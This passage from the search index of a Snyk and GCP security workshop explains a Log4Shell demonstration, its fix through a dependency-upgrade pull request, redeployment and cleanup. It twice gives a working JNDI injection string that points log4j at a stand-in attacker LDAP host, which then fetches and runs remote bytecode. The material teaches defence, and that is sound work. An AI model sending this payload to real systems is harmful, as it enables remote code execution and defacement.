log4j open source library The log4j code (at that version) blindly interpolates the JNDI addresses and queries the network for remote values Search queries are being logged by the application using log4j When the interpolated ${jndi:ldap://ldap.darkweb:80/#Vandalize} string was encountered, log4j queried an LDAP server named ldap.darkweb to ask for something named \u0026ldquo;/#Vandalize\u0026rdquo; \u0026rsquo;ldap.darkweb\u0026rsquo; is a malicous LDAP impersonator that recognized this request and interacted with log4j code in a way that caused malicuous Java bytecode to be returned and run in the JVM by log4j That bytecode modified the header.jsp file in this webapp The returned bytecode could have done far more mallicous things, not the least of which would be to open a remote, reverse shell into the container.\nCatching and stoping this In the next step we will look into ways to catch and fix vulnerabilities like this.\n"
},
{
	"uri": "/40_secure_application/43_fix_vulnerabilities.html",
	"title": "Step 8: Fix a vulnerability with a Snyk Pull Request",
	"tags": [],
	"description": "",
	"content": "Fix the vulnerability using a Snyk Pull Request Snyk accelerates remediation via Pull Requests to upgrade dependencies to non-vulnerable versions. Back in Snyk, click into the todolist/todolist-web-struts/pom.xml project.\nNow scroll down to see the list of vulnerabilities. For each Vulnerability, Snyk displays:\nThe module that introduced it and, in the case of transitive dependencies, its direct dependency, Details on the path and proposed Remediation, as well as the specific vulnerable function. Find the Remote Code Execution (RCE) vulnerability in log4j-core by searching for it in the search bar. (although it probably will be at the top of the list)\nSince a fix is available, Snyk can upgrade the vulnerable dependency to a non-vulnerable version through a Pull Request. Click on \u0026ldquo;Fix this vulnerability\u0026rdquo; to do so.\nIn the next screen, confirm the issue, then click the button to \u0026ldquo;Open a Fix PR\u0026rdquo;.\nReview the changes in the GitHub Pull Request view. When the Pull Request is ready, you\u0026rsquo;re taken to GitHub, where you can review the changes in the file diff view.\nReview the changes, then merge the PR when ready.\n"
},
{
	"uri": "/40_secure_application/44_redeploy_verify_fix.html",
	"title": "Step 9: Verify the Vulnerability is no longer exploitable.",
	"tags": [],
	"description": "",
	"content": "Update your working copy Back in your terminal, pull the latest changes, including the Snyk Fix, to the working environment.\ngit pull Re-build the Image Now build and push the container to GAR (make sure you are cd\u0026rsquo;ed into the todolist directory).\ndocker build -t $REPO/todolist:latest . docker push $REPO/todolist:latest Re-deploy the Application to GKE After pushing the image to GAR, push it to GKE by scaling the goof deployment with kubectl. The deployment\u0026rsquo;s ImagePullPolicy forces GKE to pull the latest image from GAR.\nkubectl scale deployment todolist --replicas=0 kubectl scale deployment todolist --replicas=1 Verify the Exploit no longer works Refresh your broweser tab on the todolist app and log back in (user: foo@bar.org, password: foobar) and submit the same JDNI search string: ${jndi:ldap://ldap.darkweb:80/#Vandalize}. The page will not show the graphiti because the newer version on Log4J no longer is vulnerable!\n"
},
{
	"uri": "/90_conclusion.html",
	"title": "Conclusion",
	"tags": [],
	"description": "",
	"content": "Conclusion Congrats! You\u0026rsquo;ve reached the end of today\u0026rsquo;s workshop!\nRecap Cleanup "
},
{
	"uri": "/90_conclusion/91_recap.html",
	"title": "Recap",
	"tags": [],
	"description": "",
	"content": "Well Done 🎉 Congratulations! 🎉 You have completed today\u0026rsquo;s worshop on migrating and modernizing with Snyk and GCP!\nRecap on what you have learned Today we\u0026rsquo;ve learned:\nThe kinds of invisible risks present in seemingly innocent applications How to scan container images for Base Image vulnerabilities using the Snyk CLI Identifying and fixing Application Vulnerabilities using Snyk Final Thoughts We hope you have seen some of the wins your organization can have while using Snyk. Reach out if you have any questions via https://snyk.io\n"
},
{
	"uri": "/90_conclusion/92_cleanup.html",
	"title": "Cleanup",
	"tags": [],
	"description": "",
	"content": "Cleanup In order to prevent charges to your account we recommend cleaning up the infrastructure that was created. If you plan to keep things running so you can examine the workshop a bit more please remember to do the cleanup when you are done. It is very easy to leave things running in an GCP account, forget about it, and then accrue charges.\nAssuming you set the GCP_PROJECT variable with the project name you created via gcloud init, tear down can be done by simply running gcloud projects delete $GCP_PROJECT.\n# Delete CloudFormation Stacks $ gcloud projects delete $GCP_PROJECT Your project will be deleted. Do you want to continue (Y/n)? Deleted [https://cloudresourcemanager.googleapis.com/v1/projects/snyk-workshop-project]. You can undo this operation for a limited period by running the command below. $ gcloud projects undelete snyk-workshop-project See https://cloud.google.com/resource-manager/docs/creating-managing-projects for information on shutting down projects. "
},
{
	"uri": "/categories.html",
	"title": "Categories",
	"tags": [],
	"description": "",
	"content": ""
},
{
	"uri": "/tags.html",
	"title": "Tags",
	"tags": [],
	"description": "",
	"content": ""
}]